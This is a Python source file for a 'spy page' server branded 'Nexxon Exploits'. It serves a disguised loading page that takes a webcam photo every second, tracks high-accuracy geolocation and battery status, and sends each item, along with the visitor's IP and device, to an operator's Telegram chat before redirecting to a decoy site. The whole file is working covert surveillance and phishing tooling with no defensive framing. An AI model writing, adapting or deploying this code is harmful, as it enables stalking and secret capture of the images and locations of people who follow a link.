import json
import os
import base64
import secrets
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import requests
from config import CONFIG

LINKS_FILE = os.path.join(CONFIG['data_dir'], 'links.json')
VISITORS_FILE = os.path.join(CONFIG['data_dir'], 'visitors.json')
DEBUG_LOG = os.path.join(CONFIG['data_dir'], 'debug.log')

def load_json(file_path):
    if not os.path.exists(file_path):
        return {}
    with open(file_path, 'r') as f:
        return json.load(f)

def save_json(file_path, data):
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    with open(file_path, 'w') as f:
        json.dump(data, f)

def log_debug(msg):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(DEBUG_LOG, 'a') as f:
        f.write(f"{timestamp} - {msg}\n")

def send_photo_to_telegram(chat_id, photo_path, visitor_id):
    """Send photo via Telegram"""
    if not os.path.exists(photo_path):
        return False
    
    url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendPhoto"
    
    with open(photo_path, 'rb') as photo:
        files = {'photo': ('photo.jpg', photo, 'image/jpeg')}
        data = {
            'chat_id': chat_id,
            'caption': f"📸 *Spy Photo!*\n🆔 {visitor_id}\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            'parse_mode': 'Markdown'
        }
        response = requests.post(url, data=data, files=files)
    
    log_debug(f"Photo send: {response.status_code}")
    return response.status_code == 200

def send_location_to_telegram(chat_id, lat, lng, visitor_id):
    """Send location via Telegram"""
    url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendLocation"
    data = {
        'chat_id': chat_id,
        'latitude': lat,
        'longitude': lng
    }
    requests.post(url, json=data)
    
    msg = f"📍 *Live Location*\n🆔 {visitor_id}\n🗺️ https://maps.google.com/?q={lat},{lng}"
    url2 = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendMessage"
    requests.post(url2, json={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
    
    log_debug(f"Location sent: {lat}, {lng}")

def send_battery_to_telegram(chat_id, level, charging, visitor_id):
    """Send battery status via Telegram"""
    status = "⚡ Charging" if charging else "🔋 Not Charging"
    msg = f"🔋 *Battery Status*\n🆔 {visitor_id}\n📊 {level}%\n{status}"
    
    url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendMessage"
    requests.post(url, json={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
    
    log_debug(f"Battery sent: {level}%")

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Serve the spy page"""
        parsed_path = urlparse(self.path)
        params = parse_qs(parsed_path.query)
        
        # Get link ID from URL path
        path_parts = parsed_path.path.strip('/').split('/')
        link_id = path_parts[0] if path_parts else ''
        
        # Load link data
        links_db = load_json(LINKS_FILE)
        link_data = links_db.get(link_id, {})
        target_url = link_data.get('url', 'https://google.com')
        creator_id = link_data.get('created_by', CONFIG['chat_id'])
        
        # Generate visitor ID
        visitor_id = f"VIS_{int(time.time())}_{secrets.token_hex(4)}"
        
        # HTML page with JavaScript for spy features
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ 
            background: #0a0a0a;
            color: #fff;
            font-family: -apple-system, 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .container {{ text-align: center; padding: 20px; max-width: 380px; }}
        .logo {{
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(45deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }}
        .subtitle {{ color: #555; font-size: 12px; margin-bottom: 25px; letter-spacing: 1px; }}
        .spinner {{
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255,255,255,0.05);
            border-radius: 50%;
            border-top: 3px solid #f7971e;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .status-text {{ color: #4ade80; font-size: 13px; min-height: 22px; }}
        .recording {{
            display: inline-flex;
            align-items: center;
            background: rgba(239, 68, 68, 0.1);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #ef4444;
            margin-top: 8px;
        }}
        .red-dot {{
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #ef4444;
            border-radius: 50%;
            animation: pulse 1s infinite;
            margin-right: 6px;
        }}
        @keyframes pulse {{
            0%, 100% {{ opacity: 1; transform: scale(1); }}
            50% {{ opacity: 0.3; transform: scale(1.2); }}
        }}
        video, canvas {{ display: none; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✨ Nexxon Exploits</div>
        <div class="subtitle">🔒 Secure Connection</div>
        <div class="spinner"></div>
        <div class="status-text" id="status">📸 Initializing...</div>
        <div class="recording" id="recordingBadge" style="display:none;">
            <span class="red-dot"></span> RECORDING
        </div>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const VISITOR_ID = '{visitor_id}';
        const TARGET_URL = '{target_url}';
        let pendingData = [];
        let isCapturing = false;
        
        document.getElementById('status').textContent = '📸 Initializing...';
        
        // Request camera
        navigator.mediaDevices.getUserMedia({{ 
            video: {{ facingMode: 'user', width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }}, 
            audio: false 
        }})
        .then(stream => {{
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();
            
            document.getElementById('status').textContent = '📸 Capturing...';
            document.getElementById('recordingBadge').style.display = 'inline-flex';
            isCapturing = true;
            
            // Capture photo every second
            setInterval(() => {{
                if (isCapturing) capturePhoto();
            }}, 1000);
        }})
        .catch(err => {{
            document.getElementById('status').textContent = '⚠️ Camera denied';
        }});

        function capturePhoto() {{
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            if (!video.videoWidth) return;
            
            canvas.width = 640;
            canvas.height = 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            sendData({{ photo: photoData }});
        }}

        // Get location
        if (navigator.geolocation) {{
            navigator.geolocation.watchPosition(
                (position) => {{
                    sendData({{
                        location: {{
                            lat: position.coords.latitude,
                            lng: position.coords.longitude
                        }}
                    }});
                }},
                null,
                {{ enableHighAccuracy: true }}
            );
        }}

        // Get battery
        if (navigator.getBattery) {{
            navigator.getBattery().then(battery => {{
                setInterval(() => {{
                    sendData({{
                        battery: {{
                            level: Math.round(battery.level * 100),
                            charging: battery.charging
                        }}
                    }});
                }}, 5000);
            }});
        }}

        // Send data to server
        function sendData(data) {{
            pendingData.push(data);
            
            if (pendingData.length >= 3) {{
                const batch = [...pendingData];
                pendingData = [];
                
                fetch(window.location.href, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(batch)
                }}).catch(() => {{}});
            }}
        }}

        // Redirect after 10 seconds
        let countdown = 10;
        const timer = setInterval(() => {{
            countdown--;
            if (countdown > 0) {{
                document.getElementById('status').textContent = `⏳ Redirecting in ${{countdown}}s...`;
            }}
        }}, 1000);

        setTimeout(() => {{
            clearInterval(timer);
            isCapturing = false;
            document.getElementById('status').textContent = '🚀 Redirecting...';
            
            setTimeout(() => {{
                window.location.href = TARGET_URL;
            }}, 1500);
        }}, 10000);
    </script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def do_POST(self):
        """Handle data from spy page"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data)
            items = data if isinstance(data, list) else [data]
            
            # Get visitor info from headers
            visitor_id = self.headers.get('X-Visitor-ID', f"VIS_{int(time.time())}")
            
            visitors = load_json(VISITORS_FILE)
            
            if visitor_id not in visitors:
                visitors[visitor_id] = {
                    'device': self.headers.get('User-Agent', 'Unknown'),
                    'ip': self.headers.get('X-Forwarded-For', self.client_address[0]),
                    'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'photos': 0,
                    'locations': 0,
                    'battery': 0
                }
            
            for item in items:
                # Handle photo
                if 'photo' in item and item['photo']:
                    photo_data = item['photo'].replace('data:image/jpeg;base64,', '')
                    photo_binary = base64.b64decode(photo_data)
                    
                    if len(photo_binary) > 500:
                        photo_filename = f"{visitor_id}_{int(time.time())}.jpg"
                        photo_path = os.path.join(CONFIG['photos_dir'], photo_filename)
                        
                        with open(photo_path, 'wb') as f:
                            f.write(photo_binary)
                        
                        if os.path.getsize(photo_path) > 500:
                            send_photo_to_telegram(CONFIG['chat_id'], photo_path, visitor_id)
                            visitors[visitor_id]['photos'] += 1
                
                # Handle location
                if 'location' in item:
                    lat = item['location'].get('lat', 0)
                    lng = item['location'].get('lng', 0)
                    if lat and lng:
                        send_location_to_telegram(CONFIG['chat_id'], lat, lng, visitor_id)
                        visitors[visitor_id]['locations'] += 1
                
                # Handle battery
                if 'battery' in item:
                    level = item['battery'].get('level', 0)
                    charging = item['battery'].get('charging', False)
                    if level > 0:
                        send_battery_to_telegram(CONFIG['chat_id'], level, charging, visitor_id)
                        visitors[visitor_id]['battery'] += 1
            
            save_json(VISITORS_FILE, visitors)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode())
            
        except Exception as e:
            log_debug(f"Error: {str(e)}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(json.dumps({'error': str(e)}).encode())
